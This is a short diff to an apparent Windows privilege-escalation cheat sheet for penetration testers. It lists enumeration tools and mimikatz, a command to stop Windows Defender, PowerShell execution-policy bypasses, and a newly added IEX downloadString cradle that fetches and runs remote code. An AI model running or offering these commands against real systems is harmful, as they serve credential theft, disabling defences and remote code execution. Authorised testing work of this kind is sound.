@@ -9,7 +9,7 @@ winPEAS.exe
 winPEAS.bat
 windows-privesc-check2.exe
 Seatbelt.exe -group=all
-powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+Import-Module .\PowerUp.ps1; Invoke-AllChecks;
 Powerless.bat
 
 # Search for CVE
@@ -22,7 +22,7 @@ wmic qfe > qfe.txt
 python wes.py -u
 python wes.py systeminfo.txt qfe.txt
 
-powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
+Import-Module .\Sherlock.ps1; Find-AllVulns;
 
 # Look for:
 cheat autorun
@@ -53,7 +53,11 @@ mimikatz.exe
 sc stop WinDefend
 
 # Bypass restriction
-powershell -nop -ep bypass
+powershell -nop -ep bypass -c
+powershell -exec bypass -c 
+
+#Powershell download
+IEX(New-Object Net.WebClient).downloadString('')
 
 # List hidden files
 dir /a
